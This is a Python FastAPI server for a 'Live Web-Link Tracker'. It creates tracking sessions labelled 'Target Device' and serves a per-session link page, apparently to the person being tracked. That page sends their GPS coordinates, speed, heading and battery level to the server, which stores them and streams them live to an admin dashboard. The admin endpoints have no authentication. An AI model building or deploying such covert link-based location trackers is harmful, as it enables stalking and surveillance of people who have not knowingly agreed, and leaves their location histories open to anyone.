import sqlite3
import os
import json
import time
from typing import Dict, List
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from pydantic import BaseModel

DB_PATH = os.path.join(os.path.dirname(__file__), "tracker.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            label TEXT,
            created_at REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            speed REAL,
            heading REAL,
            battery REAL,
            timestamp REAL,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    """)
    conn.commit()
    conn.close()

init_db()

class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, List[WebSocket]] = {}

    async def connect(self, session_id: str, websocket: WebSocket):
        await websocket.accept()
        if session_id not in self.active_connections:
            self.active_connections[session_id] = []
        self.active_connections[session_id].append(websocket)

    def disconnect(self, session_id: str, websocket: WebSocket):
        if session_id in self.active_connections:
            if websocket in self.active_connections[session_id]:
                self.active_connections[session_id].remove(websocket)
            if not self.active_connections[session_id]:
                del self.active_connections[session_id]

    async def broadcast(self, session_id: str, message: dict):
        if session_id in self.active_connections:
            dead_connections = []
            for connection in self.active_connections[session_id]:
                try:
                    await connection.send_json(message)
                except Exception:
                    dead_connections.append(connection)
            for dead in dead_connections:
                self.disconnect(session_id, dead)

manager = ConnectionManager()
app = FastAPI(title="Live Web-Link Tracker")

class SessionCreate(BaseModel):
    label: str = "Target Device"

class LocationPayload(BaseModel):
    latitude: float
    longitude: float
    accuracy: float = 0.0
    speed: float = 0.0
    heading: float = 0.0
    battery: float = 0.0

@app.get("/", response_class=RedirectResponse)
async def root():
    return RedirectResponse(url="/admin")

@app.post("/api/sessions")
async def create_session(data: SessionCreate):
    import secrets
    session_id = secrets.token_hex(4)
    now = time.time()
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO sessions (session_id, label, created_at) VALUES (?, ?, ?)",
        (session_id, data.label, now)
    )
    conn.commit()
    conn.close()
    return {"session_id": session_id, "label": data.label, "created_at": now}

@app.get("/api/sessions")
async def list_sessions():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT s.session_id, s.label, s.created_at,
               (SELECT COUNT(*) FROM locations l WHERE l.session_id = s.session_id) as point_count,
               (SELECT timestamp FROM locations l WHERE l.session_id = s.session_id ORDER BY id DESC LIMIT 1) as last_seen
        FROM sessions s
        ORDER BY s.created_at DESC
    """)
    rows = cursor.fetchall()
    conn.close()
    return [
        {
            "session_id": r[0],
            "label": r[1],
            "created_at": r[2],
            "point_count": r[3],
            "last_seen": r[4]
        }
        for r in rows
    ]

@app.get("/api/sessions/{session_id}")
async def get_session_history(session_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT session_id, label, created_at FROM sessions WHERE session_id = ?", (session_id,))
    session = cursor.fetchone()
    if not session:
        conn.close()
        raise HTTPException(status_code=404, detail="Session not found")

    cursor.execute("""
        SELECT latitude, longitude, accuracy, speed, heading, battery, timestamp
        FROM locations
        WHERE session_id = ?
        ORDER BY id ASC
    """, (session_id,))
    points = cursor.fetchall()
    conn.close()

    return {
        "session_id": session[0],
        "label": session[1],
        "created_at": session[2],
        "points": [
            {
                "latitude": p[0],
                "longitude": p[1],
                "accuracy": p[2],
                "speed": p[3],
                "heading": p[4],
                "battery": p[5],
                "timestamp": p[6]
            }
            for p in points
        ]
    }

@app.delete("/api/sessions/{session_id}")
async def delete_session(session_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM locations WHERE session_id = ?", (session_id,))
    cursor.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
    conn.commit()
    conn.close()
    return {"status": "deleted"}

@app.post("/api/location/{session_id}")
async def receive_location(session_id: str, data: LocationPayload):
    now = time.time()
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT session_id FROM sessions WHERE session_id = ?", (session_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO sessions (session_id, label, created_at) VALUES (?, ?, ?)", (session_id, "Direct Client", now))
    
    cursor.execute("""
        INSERT INTO locations (session_id, latitude, longitude, accuracy, speed, heading, battery, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (session_id, data.latitude, data.longitude, data.accuracy, data.speed, data.heading, data.battery, now))
    conn.commit()
    conn.close()

    location_event = {
        "type": "location_update",
        "session_id": session_id,
        "latitude": data.latitude,
        "longitude": data.longitude,
        "accuracy": data.accuracy,
        "speed": data.speed,
        "heading": data.heading,
        "battery": data.battery,
        "timestamp": now
    }
    await manager.broadcast(session_id, location_event)
    return {"status": "ok", "timestamp": now}

@app.websocket("/ws/{session_id}")
async def websocket_endpoint(websocket: WebSocket, session_id: str):
    await manager.connect(session_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(session_id, websocket)

@app.get("/track/{session_id}", response_class=HTMLResponse)
async def serve_target_page(session_id: str):
    path = os.path.join(os.path.dirname(__file__), "templates", "track.html")
    with open(path, "r", encoding="utf-8") as f:
        html = f.read()
    return html.replace("{{SESSION_ID}}", session_id)

@app.get("/admin", response_class=HTMLResponse)
async def serve_admin_page():
    path = os.path.join(os.path.dirname(__file__), "templates", "admin.html")
    with open(path, "r", encoding="utf-8") as f:
        return f.read()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=True)

